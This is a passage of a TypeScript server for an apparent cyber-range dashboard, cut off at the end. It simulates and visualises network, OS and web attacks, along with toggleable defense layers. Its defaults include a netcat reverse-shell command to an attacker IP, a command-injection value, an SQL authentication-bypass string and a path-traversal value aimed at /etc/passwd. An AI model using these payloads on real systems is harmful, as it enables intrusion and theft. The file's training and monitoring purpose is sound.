import express, { Request, Response } from 'express';
import http from 'http';
import { Server as SocketIOServer } from 'socket.io';
import cors from 'cors';
import path from 'path';
import { config } from './config';
import { RingBuffer } from './ring-buffer';
import type {
  TelemetryLog,
  ArpCacheEntry,
  SniffedPacket,
  NetworkAttackState,
  ProcessTreeNode,
  L7SecurityAlert,
  OsAndL7AttackState,
} from '@shared/schemas';
import type { AttackEvent } from '@shared/schemas/attack-event';
import { readFileSync } from 'node:fs';
import Ajv from 'ajv';
import { TargetDefense, isDefenseSubFlag, isDefenseLayerId } from './defense';

const app = express();
const server = http.createServer(app);

// Cấu hình Socket.io với CORS linh hoạt
const io = new SocketIOServer(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
  },
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Khởi tạo Ring Buffer tối đa 300 phần tử trong RAM
const telemetryBuffer = new RingBuffer<TelemetryLog>(config.maxBufferSize);

// Trạng thái hệ thống và sockets giả lập thời gian thực
const defense = new TargetDefense(config.targetAppUrl);
const attackEvents = new Map<string, AttackEvent>();
const validateAttack = new Ajv({ strict: false }).compile<AttackEvent>(JSON.parse(readFileSync(config.attackSchema, 'utf8')));
const socketMetrics = {
  source: 'simulated' as 'simulated' | 'host_agent',
  established: 12,
  syn_recv: 0,
  time_wait: 4,
  last_updated: new Date().toISOString(),
};

// ==========================================
// W3-T1: L2/L4 NETWORK ATTACK STATE (ARP, MITM, SYN, RST)
// ==========================================
const DEFAULT_MACS = {
  client: '02:42:ac:14:00:0a',
  target: '02:42:ac:14:00:14',
  attacker: '02:42:ac:14:00:42',
};

function createCleanArpTable(): ArpCacheEntry[] {
  const now = new Date().toISOString();
  return [
    {
      ip: config.nodes.client,
      mac: DEFAULT_MACS.client,
      expected_mac: DEFAULT_MACS.client,
      iface: 'eth0',
      role: 'CLIENT',
      spoofed: false,
      updated_at: now,
    },
    {
      ip: config.nodes.target,
      mac: DEFAULT_MACS.target,
      expected_mac: DEFAULT_MACS.target,
      iface: 'eth0',
      role: 'TARGET_SERVER',
      spoofed: false,
      updated_at: now,
    },
    {
      ip: config.nodes.attacker,
      mac: DEFAULT_MACS.attacker,
      expected_mac: DEFAULT_MACS.attacker,
      iface: 'eth0',
      role: 'HACKER',
      spoofed: false,
      updated_at: now,
    },
  ];
}

const SYN_HISTORY_LENGTH = 16;

const networkState: NetworkAttackState = {
  mitm_active: false,
  arp_table: createCleanArpTable(),
  sniffed_packets: [],
  rst_injection: {
    active: false,
    disrupted_sessions: 0,
    last_rst_at: null,
    last_seq_num: null,
    victim_ip: config.nodes.client,
    target_ip: config.nodes.target,
  },
  syn_history: Array(SYN_HISTORY_LENGTH).fill(0),
  last_updated: new Date().toISOString(),
};

function recordSynHistory(value: number) {
  networkState.syn_history.push(value);
  if (networkState.syn_history.length > SYN_HISTORY_LENGTH) {
    networkState.syn_history.shift();
  }
  networkState.last_updated = new Date().toISOString();
}

function poisonArpCache(hackerMac: string = DEFAULT_MACS.attacker) {
  const now = new Date().toISOString();
  networkState.mitm_active = true;
  networkState.arp_table = networkState.arp_table.map((entry) => {
    if (entry.role === 'TARGET_SERVER' || entry.role === 'CLIENT') {
      return {
        ...entry,
        mac: hackerMac,
        spoofed: true,
        updated_at: now,
      };
    }
    return { ...entry, updated_at: now };
  });
  networkState.last_updated = now;
}

function resetNetworkState() {
  networkState.mitm_active = false;
  networkState.arp_table = createCleanArpTable();
  networkState.sniffed_packets = [];
  networkState.rst_injection = {
    active: false,
    disrupted_sessions: 0,
    last_rst_at: null,
    last_seq_num: null,
    victim_ip: config.nodes.client,
    target_ip: config.nodes.target,
  };
  networkState.syn_history = Array(SYN_HISTORY_LENGTH).fill(0);
  networkState.last_updated = new Date().toISOString();
}

// ==========================================
// W4-T1: OS & L7 ATTACK STATE (PSTREE, REVERSE SHELL, LSOF FD GAUGE, SQLI/BRUTE-FORCE ALERTS)
// ==========================================
function createCleanProcessTree(): ProcessTreeNode[] {
  return [
    {
      pid: 1,
      name: 'python3',
      cmd: 'python3 /app/target-entrypoint.py',
      user: 'root',
      suspicious: false,
      children: [
        {
          pid: 18,
          name: 'sshd',
          cmd: '/usr/sbin/sshd -D -e',
          user: 'root',
          suspicious: false,
          children: [],
        },
        {
          pid: 24,
          name: 'node',
          cmd: 'node dist/main.js (Target Server :8000)',
          user: 'node',
          suspicious: false,
          children: [
            {
              pid: 31,
              name: 'sqlite3-worker',
              cmd: 'sqlite3 /data/target.sqlite',
              user: 'node',
              suspicious: false,
            },
          ],
        },
      ],
    },
  ];
}

function createCleanOsL7State(): OsAndL7AttackState {
  return {
    pstree: createCleanProcessTree(),
    suspicious_processes: [],
    reverse_shell: {
      active: false,
      spawned_at: null,
      shell_cmd: null,
      server_ip: config.nodes.target,
      hacker_ip: config.nodes.attacker,
      hacker_port: 4444,
      pid: null,
    },
    fd_metrics: {
      open_fds: 42,
      max_fds: 1024,
      peak_fds: 42,
      status: 'NORMAL',
      suspicious_files: [],
      process_count: 4,
    },
    l7_alerts: [],
    l7_counters: {
      sqli_count: 0,
      brute_force_count: 0,
      cmd_injection_count: 0,
      path_traversal_count: 0,
      heavy_dos_count: 0,
    },
    last_updated: new Date().toISOString(),
  };
}

let osL7State: OsAndL7AttackState = createCleanOsL7State();
let bruteForceAttemptsTracker = 0;

function resetOsL7State() {
  osL7State = createCleanOsL7State();
  bruteForceAttemptsTracker = 0;
}

function computeFdStatus(openFds: number, maxFds: number): 'NORMAL' | 'WARNING' | 'EXHAUSTED' {
  const ratio = maxFds > 0 ? openFds / maxFds : 0;
  if (ratio >= 0.85) return 'EXHAUSTED';
  if (ratio >= 0.55) return 'WARNING';
  return 'NORMAL';
}

function updateFdMetrics(openFds: number, maxFds?: number, extraFile?: string) {
  if (typeof maxFds === 'number' && maxFds > 0) {
    osL7State.fd_metrics.max_fds = maxFds;
  }
  const clamped = Math.max(12, Math.min(osL7State.fd_metrics.max_fds, Math.round(openFds)));
  osL7State.fd_metrics.open_fds = clamped;
  if (clamped > osL7State.fd_metrics.peak_fds) {
    osL7State.fd_metrics.peak_fds = clamped;
  }
  osL7State.fd_metrics.status = computeFdStatus(clamped, osL7State.fd_metrics.max_fds);
  if (extraFile && !osL7State.fd_metrics.suspicious_files.includes(extraFile)) {
    osL7State.fd_metrics.suspicious_files.push(extraFile);
    if (osL7State.fd_metrics.suspicious_files.length > 8) {
      osL7State.fd_metrics.suspicious_files.shift();
    }
  }
  osL7State.last_updated = new Date().toISOString();
}

function countTreeProcesses(nodes: ProcessTreeNode[]): number {
  let count = 0;
  for (const n of nodes) {
    count += 1;
    if (Array.isArray(n.children)) {
      count += countTreeProcesses(n.children);
    }
  }
  return count;
}

function spawnReverseShellInTree(shellCmd?: string, hackerPort = 4444) {
  const now = new Date().toISOString();
  const cmdStr = shellCmd || `nc -e /bin/sh ${config.nodes.attacker} ${hackerPort}`;
  const shPid = 412;
  const ncPid = 413;

  const cleanTree = createCleanProcessTree();
  const rootNode = cleanTree[0];
  const nodeServerProc = rootNode?.children?.find((c) => c.name === 'node');
  if (nodeServerProc) {
    nodeServerProc.children = [
      ...(nodeServerProc.children || []),
      {
        pid: shPid,
        name: '/bin/sh',
        cmd: `/bin/sh -c "ping -c 1 127.0.0.1; ${cmdStr}"`,
        user: 'node',
        suspicious: true,
        children: [
          {
            pid: ncPid,
            name: 'nc',
            cmd: cmdStr,
            user: 'node',
            suspicious: true,
            children: [
              {
                pid: 414,
                name: '/bin/sh',
                cmd: '/bin/sh -i (interactive reverse shell)',
                user: 'node',
                suspicious: true,
              },
            ],
          },
        ],
      },
    ];
  }

  osL7State.pstree = cleanTree;
  osL7State.suspicious_processes = ['/bin/sh -c', cmdStr, '/bin/sh -i'];
  osL7State.reverse_shell = {
    active: true,
    spawned_at: now,
    shell_cmd: cmdStr,
    server_ip: config.nodes.target,
    hacker_ip: config.nodes.attacker,
    hacker_port: hackerPort,
    pid: ncPid,
  };
  osL7State.fd_metrics.process_count = countTreeProcesses(osL7State.pstree);
  updateFdMetrics(
    Math.max(osL7State.fd_metrics.open_fds + 18, 76),
    undefined,
    `socket:[reverse-shell -> ${config.nodes.attacker}:${hackerPort}]`,
  );
  osL7State.last_updated = now;
}

function appendL7Alert(alert: Omit<L7SecurityAlert, 'id' | 'timestamp'> & { id?: string; timestamp?: string }) {
  const entry: L7SecurityAlert = {
    id: alert.id || `l7-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    timestamp: alert.timestamp || new Date().toISOString(),
    category: alert.category,
    severity: alert.severity,
    client_ip: alert.client_ip,
    endpoint: alert.endpoint,
    payload_preview: alert.payload_preview,
    status_code: alert.status_code,
    blocked: alert.blocked,
    attempts_count: alert.attempts_count,
    rate_rps: alert.rate_rps,
  };
  osL7State.l7_alerts.push(entry);
  if (osL7State.l7_alerts.length > 50) {
    osL7State.l7_alerts.shift();
  }
  osL7State.last_updated = entry.timestamp;
  return entry;
}

function updateOsAndL7FromLog(log: TelemetryLog) {
  const tag = log.attack_tag || 'NORMAL';
  const summary = typeof log.payload_summary === 'object' && log.payload_summary !== null
    ? (log.payload_summary as Record<string, unknown>)
    : {};
  const body = typeof summary.body_preview === 'object' && summary.body_preview !== null
    ? (summary.body_preview as Record<string, unknown>)
    : {};
  const query = typeof summary.query === 'object' && summary.query !== null
    ? (summary.query as Record<string, unknown>)
    : {};
  const isBlocked =
    log.defense_action === 'blocked' ||
    log.defense_action === 'sanitized' ||
    log.defense_action === 'rate_limited' ||
    log.status_code === 400 ||
    log.status_code === 401 ||
    log.status_code === 403 ||
    log.status_code === 429;
  const ts = typeof log.timestamp === 'string' ? log.timestamp : new Date().toISOString();

  if (tag === 'SQL_INJECTION') {
    osL7State.l7_counters.sqli_count += 1;
    const rawUser = typeof body.username === 'string' ? body.username : "admin' OR '1'='1' --";
    appendL7Alert({
      timestamp: ts,
      category: 'SQL_INJECTION',
      severity: 'CRITICAL',
      client_ip: log.client_ip,
      endpoint: log.endpoint,
      payload_preview: `username="${rawUser}" (SQL Auth Bypass)`,
      status_code: log.status_code,
      blocked: isBlocked && log.status_code !== 200,
    });
  } else if (
    tag === 'BRUTE_FORCE' ||
    (log.endpoint.includes('login') && (log.status_code === 401 || log.status_code === 429) && tag !== 'SQL_INJECTION')
  ) {
    osL7State.l7_counters.brute_force_count += 1;
    const attempts = typeof summary.attempts_count === 'number'
      ? summary.attempts_count
      : (bruteForceAttemptsTracker += 1);
    const rateRps = typeof summary.rate_rps === 'number' ? summary.rate_rps : 1;
    const userTarget = typeof body.username === 'string' ? body.username : 'admin';
    const passGuess = typeof body.password === 'string' ? body.password : ` wordlist#${attempts}`;
    appendL7Alert({
      timestamp: ts,
      category: 'BRUTE_FORCE',
      severity: attempts >= 5 ? 'CRITICAL' : 'HIGH',
      client_ip: log.client_ip,
      endpoint: log.endpoint,
      payload_preview: `user="${userTarget}" pass="${passGuess}" (${attempts} attempts @ ${rateRps} req/s)`,
      status_code: log.status_code,
      blocked: log.status_code === 429 || log.defense_action === 'rate_limited',
      attempts_count: attempts,
      rate_rps: rateRps,
    });
  } else if (tag === 'COMMAND_INJECTION' || tag === 'REVERSE_SHELL') {
    osL7State.l7_counters.cmd_injection_count += 1;
    const hostParam = typeof query.host === 'string'
      ? query.host
      : typeof summary.shell_cmd === 'string'
        ? summary.shell_cmd
        : `127.0.0.1; nc -e /bin/sh ${config.nodes.attacker} 4444`;
    const blockedByL3 = (log.status_code >= 400 || log.defense_action === 'blocked' || log.defense_action === 'sanitized') && tag !== 'REVERSE_SHELL';
    const blockedByL2 = defense.l2Os;
    const blocked = blockedByL3 || blockedByL2;
    appendL7Alert({
      timestamp: ts,
      category: 'COMMAND_INJECTION',
      severity: 'CRITICAL',
      client_ip: log.client_ip,
      endpoint: log.endpoint,
      payload_preview: blockedByL2 && !blockedByL3
        ? `cmd="${hostParam}" [BLOCKED BY L2 OS: nologin/cgroups]`
        : `cmd="${hostParam}"`,
      status_code: blockedByL2 && log.status_code < 400 ? 403 : log.status_code,
      blocked,
    });
    if (!blocked) {
      const shellCmd = typeof summary.shell_cmd === 'string'
        ? summary.shell_cmd
        : `nc -e /bin/sh ${config.nodes.attacker} 4444`;
      spawnReverseShellInTree(shellCmd);
    }
  } else if (tag === 'PATH_TRAVERSAL') {
    osL7State.l7_counters.path_traversal_count += 1;
    const targetFile = typeof query.name === 'string'
      ? query.name
      : typeof query.file === 'string'
        ? query.file
        : typeof summary.target_file === 'string'
          ? summary.target_file
          : '../../../../etc/passwd';
    const blocked = log.status_code >= 400 || log.defense_action === 'blocked' || log.defense_action === 'sanitized';
    appendL7Alert({
      timestamp: ts,
      category: 'PATH_TRAVERSAL',
      severity: 'HIGH',
      client_ip: log.client_ip,
      endpoint: log.endpoint,
      payload_preview: `file="${targetFile}"`,
      status_code: log.status_code,
      blocked,
    });
    if (!blocked) {
      updateFdMetrics(osL7State.fd_metrics.open_fds + 6, undefined, targetFile.includes('environ') ? '/proc/self/environ' : '/etc/passwd');
    }
  } else if (tag === 'FD_EXHAUSTION' || tag === 'FORK_BOMB') {
    if (defense.l2Os) {
      // L2 OS Shield (ulimit -n 512 / cgroups pids.max=50) contains FD exhaustion and fork bomb!
      updateFdMetrics(Math.min(180, osL7State.fd_metrics.open_fds + 24), 512);
      osL7State.fd_metrics.process_count = Math.min(12, osL7State.fd_metrics.process_count);
    } else {
      const requestedFds = typeof summary.open_fds === 'number' ? summary.open_fds : 960;
      const maxFds = typeof summary.max_fds === 'number' ? summary.max_fds : osL7State.fd_metrics.max_fds;
      updateFdMetrics(requestedFds, maxFds, '/tmp/fd_exhaust_hold_* (x900)');
      osL7State.fd_metrics.process_count = tag === 'FORK_BOMB' ? 128 : Math.max(8, osL7State.fd_metrics.process_count);
    }
  } else if (tag === 'HEAVY_DOS') {
    osL7State.l7_counters.heavy_dos_count += 1;
    const iter = typeof query.iterations === 'number' ? query.iterations : 500000;
    const blocked = log.status_code === 429 || log.defense_action === 'rate_limited';
    appendL7Alert({
      timestamp: ts,
      category: 'HEAVY_DOS',
      severity: 'HIGH',
      client_ip: log.client_ip,
      endpoint: log.endpoint,
      payload_preview: `Heavy Report CPU Exhaustion (iterations=${iter})`,
      status_code: log.status_code,
      blocked,
    });
    if (!blocked) {
      updateFdMetrics(Math.min(osL7State.fd_metrics.max_fds, osL7State.fd_metrics.open_fds + 45));
    }
  }
}

function appendSniffedPacket(packet: Omit<SniffedPacket, 'id' | 'timestamp'> & { id?: string; timestamp?: string }) {
  const entry: SniffedPacket = {
    id: packet.id || `sniff-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    timestamp: packet.timestamp || new Date().toISOString(),
    src_ip: packet.src_ip,
    dst_ip: packet.dst_ip,
    method: packet.method,
    endpoint: packet.endpoint,
    username: packet.username,
    password: packet.password,
    token_preview: packet.token_preview,
    raw_preview: packet.raw_preview,
  };
  networkState.sniffed_packets.push(entry);
  if (networkState.sniffed_packets.length > 50) {
    networkState.sniffed_packets.shift();
  }
  networkState.last_updated = entry.timestamp;
  return entry;
}

function extractSniffedInfoFromLog(log: TelemetryLog) {
  const summary = typeof log.payload_summary === 'object' && log.payload_summary !== null
    ? (log.payload_summary as Record<string, unknown>)
    : {};
  const body = typeof summary.body_preview === 'object' && summary.body_preview !== null
    ? (summary.body_preview as Record<string, unknown>)
    : {};
  const headers = typeof summary.headers === 'object' && summary.headers !== null
    ? (summary.headers as Record<string, string>)
    : {};

  const username = typeof body.username === 'string'
    ? body.username
    : typeof summary.username === 'string'
      ? summary.username
      : undefined;
  const password = typeof body.password === 'string'
    ? body.password
    : typeof summary.password === 'string'
      ? summary.password
      : undefined;
  const tokenPreview = typeof body.token === 'string'
    ? body.token
    : typeof summary.token_preview === 'string'
      ? summary.token_preview
      : typeof headers.authorization === 'string'
        ? headers.authorization
        : undefined;

  const isAuthEndpoint = log.endpoint.includes('login') || log.endpoint.includes('auth');
  if (username || password || tokenPreview || isAuthEndpoint || log.attack_tag === 'ARP_SPOOF') {
    const userVal = username || 'engineer_user';
    const passVal = password || 'pass123';
    const tokVal = tokenPreview || 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbmdpbmVlcl91c2VyIn0...';
    appendSniffedPacket({
      timestamp: typeof log.timestamp === 'string' ? log.timestamp : new Date().toISOString(),
      src_ip: config.nodes.client,
      dst_ip: config.nodes.target,
      method: log.method,
      endpoint: log.endpoint,
      username: userVal,
      password: passVal,
      token_preview: tokVal,
      raw_preview: `${log.method} ${log.endpoint} HTTP/1.1 | user="${userVal}" pass="${passVal}" | Auth: ${tokVal.slice(0, 36)}...`,
    });
  }
}

/**
 * Cập nhật động các chỉ số kết nối TCP & trạng thái L2/L4 dựa trên bản tin Telemetry nhận được
 */
function updateTcpMetrics(log: TelemetryLog) {
  const isAttack = Boolean(log.is_suspicious || (log.attack_tag && log.attack_tag !== 'NORMAL'));

  if (log.attack_tag === 'SYN_FLOOD') {
    if (defense.l1Network) {
      // L1 Network Shield (iptables SYN_FLOOD_LIMIT) drops SYN flood packets at L4 perimeter
      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 2, 18);
    } else if (defense.l2Os) {
      // L2 OS Shield (net.ipv4.tcp_syncookies=1) prevents half-open backlog saturation
      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 6, 32);
    } else {
      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 25, 250);
    }
  } else if (log.attack_tag === 'ARP_SPOOF') {
    if (!defense.l1Network) {
      poisonArpCache();
      extractSniffedInfoFromLog(log);
    }
  } else if (log.attack_tag === 'RST_INJECTION') {
    if (!defense.l1Network) {
      const summary = typeof log.payload_summary === 'object' && log.payload_summary !== null
        ? (log.payload_summary as Record<string, unknown>)
        : {};
      const seqNum = typeof summary.seq_num === 'number'
        ? summary.seq_num
        : Math.floor(100000000 + Math.random() * 900000000);
      networkState.rst_injection = {
        active: true,
        disrupted_sessions: networkState.rst_injection.disrupted_sessions + 1,
        last_rst_at: new Date().toISOString(),
        last_seq_num: seqNum,
        victim_ip: config.nodes.client,
        target_ip: config.nodes.target,
      };
      socketMetrics.established = Math.max(1, socketMetrics.established - 4);
      socketMetrics.time_wait = Math.min(socketMetrics.time_wait + 3, 40);
    }
  } else if (log.attack_tag === 'HEAVY_DOS') {
    socketMetrics.established = Math.min(socketMetrics.established + 8, 120);
    socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 5, 80);
  } else if (isAttack) {
    socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv + 2, 40);
  } else {
    // Lưu lượng bình thường
    socketMetrics.established = Math.max(8, Math.min(socketMetrics.established + 1, 60));
    socketMetrics.time_wait = Math.min(socketMetrics.time_wait + 1, 30);
    // Nếu đang bị MitM ARP Spoofing (và Khiên L1 tắt), mọi request từ Client đều đi qua Hacker và bị Sniff!
    if (networkState.mitm_active && !defense.l1Network) {
      extractSniffedInfoFromLog(log);
    }
  }

  recordSynHistory(socketMetrics.syn_recv);
  socketMetrics.last_updated = new Date().toISOString();
}

// Giảm dần các kết nối SYN_RECV theo chu kỳ nếu không có bão gói tin tiếp diễn
setInterval(() => {
  if (socketMetrics.syn_recv > 0) {
    socketMetrics.syn_recv = Math.max(0, socketMetrics.syn_recv - 4);
    recordSynHistory(socketMetrics.syn_recv);
  }
  if (socketMetrics.time_wait > 4) {
    socketMetrics.time_wait = Math.max(4, socketMetrics.time_wait - 1);
  }
  if (socketMetrics.established > 12) {
    socketMetrics.established = Math.max(12, socketMetrics.established - 1);
  }
}, 1500).unref();

// ==========================================
// REST API ENDPOINTS
// ==========================================

/**
 * POST /api/telemetry
 * Điểm tiếp nhận bản tin TelemetryLog từ Target App, Client hoặc Attacker
 */
app.post('/api/telemetry', (req: Request, res: Response) => {
  const log: TelemetryLog = req.body;

  if (!log || !log.endpoint || typeof log.status_code !== 'number') {
    res.status(400).json({
      success: false,
      message: 'Bản tin Telemetry không đúng định dạng TelemetryLog.',
    });
    return;
  }

  // Chuẩn hóa timestamp nếu thiếu
  if (!log.timestamp) {
    log.timestamp = new Date().toISOString();
  }

  // 1. Lưu vào Ring Buffer (FIFO, max 300)
  telemetryBuffer.push(log);

  // 2. Cập nhật chỉ số socket & trạng thái OS/L7 (W4-T1)
  updateTcpMetrics(log);
  updateOsAndL7FromLog(log);

  // 3. Phát tán sự kiện thời gian thực qua WebSocket
  io.emit('GOD_VIEW_UPDATE', {
    log,
    buffer_size: telemetryBuffer.size(),
    metrics: socketMetrics,
    network_state: networkState,
    os_l7_state: osL7State,
    defense_l3_state: defense.state,
    defense_layers: defense.getLayersState(),
  });

  res.status(200).json({
    success: true,
    message: 'Telemetry logged and broadcasted successfully.',
    buffer_size: telemetryBuffer.size(),
  });
});

/**
 * GET /api/telemetry/history
 * Trả về toàn bộ danh sách bản tin hiện có trong bộ đệm khi giao diện tải lại (F5)
 */
app.get('/api/telemetry/history', (req: Request, res: Response) => {
  res.status(200).json({
    success: true,
    count: telemetryBuffer.size(),
    capacity: telemetryBuffer.getCapacity(),
    history: telemetryBuffer.getAll(),
    defense_l3_state: defense.state,
    defense_layers: defense.getLayersState(),
    metrics: socketMetrics,
    network_state: networkState,
    os_l7_state: osL7State,
  });
});

/**
 * DELETE /api/telemetry/clear
 * Xóa rỗng toàn bộ Ring Buffer trong RAM
 */
app.delete('/api/telemetry/clear', (req: Request, res: Response) => {
  telemetryBuffer.clear();
  attackEvents.clear();
  socketMetrics.syn_recv = 0;
  socketMetrics.established = 12;
  socketMetrics.time_wait = 4;
  resetNetworkState();
  resetOsL7State();

  // Phát tín hiệu reset đến tất cả client đang kết nối
  io.emit('GOD_VIEW_RESET', {
    message: 'Telemetry buffer cleared by user.',
    timestamp: new Date().toISOString(),
    network_state: networkState,
    os_l7_state: osL7State,
    metrics: socketMetrics,
  });

  res.status(200).json({
    success: true,
    message: 'Đã xóa rỗng bộ đệm Telemetry Ring Buffer.',
  });
});

/**
 * GET /api/telemetry/network
 * Trả về trạng thái mạng L2/L4 hiện tại (ARP Cache, MitM Sniffing, RST Injection, SYN History)
 */
app.get('/api/telemetry/network', (_req: Request, res: Response) => {
  res.status(200).json({
    success: true,
    network_state: networkState,
    metrics: socketMetrics,
  });
});

/**
 * POST /api/telemetry/network
 * Cập nhật trạng thái tấn công mạng L2/L4 từ Telemetry Agent (W2-T2 / W3-T2) hoặc bảng điều khiển Demo
 */
app.post('/api/telemetry/network', (req: Request, res: Response) => {
  const body = req.body || {};

  if (body.action === 'reset_arp') {
    networkState.mitm_active = false;
    networkState.arp_table = createCleanArpTable();
    networkState.last_updated = new Date().toISOString();
  } else if (body.action === 'poison_arp' || body.mitm_active === true) {
    poisonArpCache(typeof body.hacker_mac === 'string' ? body.hacker_mac : DEFAULT_MACS.attacker);
  } else if (body.mitm_active === false) {
    networkState.mitm_active = false;
    networkState.arp_table = createCleanArpTable();
  }

  if (Array.isArray(body.arp_table)) {
    networkState.arp_table = body.arp_table;
    networkState.mitm_active = body.arp_table.some((entry: ArpCacheEntry) => Boolean(entry.spoofed));
    networkState.last_updated = new Date().toISOString();
  }

  if (body.sniffed_packet && typeof body.sniffed_packet === 'object') {
    appendSniffedPacket(body.sniffed_packet);
  }

  if (body.rst_event && typeof body.rst_event === 'object') {
    networkState.rst_injection = {
      active: true,
      disrupted_sessions: networkState.rst_injection.disrupted_sessions + 1,
      last_rst_at: new Date().toISOString(),
      last_seq_num: typeof body.rst_event.seq_num === 'number' ? body.rst_event.seq_num : 402918231,
      victim_ip: body.rst_event.victim_ip || config.nodes.client,
      target_ip: body.rst_event.target_ip || config.nodes.target,
    };
  }

  if (typeof body.syn_recv === 'number') {
    socketMetrics.syn_recv = Math.max(0, Math.min(250, body.syn_recv));
    recordSynHistory(socketMetrics.syn_recv);
  }

  io.emit('NETWORK_STATE_UPDATE', {
    network_state: networkState,
    metrics: socketMetrics,
  });

  res.status(200).json({
    success: true,
    network_state: networkState,
    metrics: socketMetrics,
  });
});

/**
 * POST /api/telemetry/host
 * Điểm tiếp nhận thông số Kernel/OS & Network (/proc/net/tcp, /proc/net/arp, lsof, pstree) từ Telemetry Agent
 */
app.post('/api/telemetry/host', (req: Request, res: Response) => {
  const { metrics, arp_table, pstree, reverse_shell } = req.body || {};
  if (!metrics || typeof metrics !== 'object') {
    res.status(400).json({ success: false, message: 'Missing metrics payload' });
    return;
  }

  if (typeof metrics.tcp_established === 'number') socketMetrics.established = metrics.tcp_established;
  if (typeof metrics.tcp_syn_recv === 'number') {
    socketMetrics.syn_recv = metrics.tcp_syn_recv;
    recordSynHistory(socketMetrics.syn_recv);
  }
  if (typeof metrics.tcp_time_wait === 'number') socketMetrics.time_wait = metrics.tcp_time_wait;
  socketMetrics.last_updated = new Date().toISOString();

  if (Array.isArray(arp_table)) {
    networkState.arp_table = arp_table;
    networkState.mitm_active = arp_table.some((entry: ArpCacheEntry) => Boolean(entry.spoofed));
    networkState.last_updated = socketMetrics.last_updated;
  }

  if (typeof metrics.open_fds === 'number') {
    updateFdMetrics(
      metrics.open_fds,
      typeof metrics.max_fds === 'number' ? metrics.max_fds : undefined,
    );
  }
  if (typeof metrics.process_count === 'number') {
    osL7State.fd_metrics.process_count = metrics.process_count;
  }
  if (Array.isArray(metrics.suspicious_processes)) {
    osL7State.suspicious_processes = metrics.suspicious_processes;
    const hasShell = metrics.suspicious_processes.some(
      (p: string) => p.includes('/bin/sh') || p.includes('nc') || p.includes('bash'),
    );
    if (hasShell && !osL7State.reverse_shell.active) {
      spawnReverseShellInTree(metrics.suspicious_processes.join(' -> '));
    }
  }
  if (Array.isArray(pstree) && pstree.length > 0) {
    osL7State.pstree = pstree;
    osL7State.fd_metrics.process_count = countTreeProcesses(pstree);
  }
  if (reverse_shell && typeof reverse_shell === 'object') {
    osL7State.reverse_shell = {
      ...osL7State.reverse_shell,
      ...reverse_shell,
    };
  }
  osL7State.last_updated = socketMetrics.last_updated;

  io.emit('NETWORK_STATE_UPDATE', {
    network_state: networkState,
    metrics: socketMetrics,
  });
  io.emit('OS_L7_STATE_UPDATE', {
    os_l7_state: osL7State,
    metrics: socketMetrics,
  });

  res.status(200).json({
    success: true,
    metrics_updated: true,
    metrics: socketMetrics,
    network_state: networkState,
    os_l7_state: osL7State,
  });
});

/**
 * GET /api/telemetry/os
 * Trả về trạng thái giám sát HĐH & Tầng Ứng dụng L7 (Task W4-T1: pstree, reverse_shell, fd_metrics, l7_alerts)
 */
app.get('/api/telemetry/os', (_req: Request, res: Response) => {
  res.status(200).json({
    success: true,
    os_l7_state: osL7State,
    metrics: socketMetrics,
  });
});

/**
 * POST /api/telemetry/os
 * Cập nhật hoặc khôi phục trạng thái HĐH & L7 (Task W4-T1 / W4-T2)
 */
app.post('/api/telemetry/os', (req: Request, res: Response) => {
  const body = req.body || {};

  if (body.action === 'reset_os') {
    osL7State.pstree = createCleanProcessTree();
    osL7State.suspicious_processes = [];
    osL7State.reverse_shell = {
      active: false,
      spawned_at: null,
      shell_cmd: null,
      server_ip: config.nodes.target,
      hacker_ip: config.nodes.attacker,
      hacker_port: 4444,
      pid: null,
    };
    osL7State.fd_metrics = {
      open_fds: 42,
      max_fds: 1024,
      peak_fds: 42,
      status: 'NORMAL',
      suspicious_files: [],
      process_count: 4,
    };
    osL7State.last_updated = new Date().toISOString();
  } else if (body.action === 'spawn_reverse_shell' || body.reverse_shell_active === true) {
    spawnReverseShellInTree(
      typeof body.shell_cmd === 'string' ? body.shell_cmd : undefined,
      typeof body.hacker_port === 'number' ? body.hacker_port : 4444,
    );
  }

  if (typeof body.open_fds === 'number') {
    updateFdMetrics(
      body.open_fds,
      typeof body.max_fds === 'number' ? body.max_fds : undefined,
      typeof body.suspicious_file === 'string' ? body.suspicious_file : undefined,
    );
  }

  if (Array.isArray(body.pstree) && body.pstree.length > 0) {
    osL7State.pstree = body.pstree;
    osL7State.fd_metrics.process_count = countTreeProcesses(body.pstree);
  }

  io.emit('OS_L7_STATE_UPDATE', {
    os_l7_state: osL7State,
    metrics: socketMetrics,
  });

  res.status(200).json({
    success: true,
    os_l7_state: osL7State,
    metrics: socketMetrics,
  });
});

/**
 * POST /api/defense/toggle
 * Chuyển tiếp (proxy) lệnh bật/tắt khiên L1 (Network), L2 (OS) hoặc L3 (App) và đồng bộ hóa qua WebSocket (Task W5-T1)
 */
function applyLayerSideEffects(layer: 'l1' | 'l2', active: boolean) {
  if (layer === 'l1' && active) {
    // Khi bật Khiên Mạng L1 (Static ARP + iptables): khóa cứng bảng ARP sạch, tắt MitM và hạ SYN_RECV
    networkState.mitm_active = false;
    networkState.arp_table = createCleanArpTable();
    networkState.rst_injection.active = false;
    socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv, 12);
    recordSynHistory(socketMetrics.syn_recv);
    io.emit('NETWORK_STATE_UPDATE', {
      network_state: networkState,
      metrics: socketMetrics,
    });
  } else if (layer === 'l2') {
    if (active) {
      // Khi bật Khiên HĐH L2 (tcp_syncookies=1, ulimit -n 512, cgroups, nologin): ngắt Reverse Shell & giới hạn FD
      osL7State.pstree = createCleanProcessTree();
      osL7State.suspicious_processes = [];
      osL7State.reverse_shell = {
        ...osL7State.reverse_shell,
        active: false,
        spawned_at: null,
        shell_cmd: null,
        pid: null,
      };
      osL7State.fd_metrics.max_fds = 512;
      osL7State.fd_metrics.process_count = 4;
      updateFdMetrics(Math.min(osL7State.fd_metrics.open_fds, 42), 512);
      socketMetrics.syn_recv = Math.min(socketMetrics.syn_recv, 24);
      recordSynHistory(socketMetrics.syn_recv);
    } else {
      osL7State.fd_metrics.max_fds = 1024;
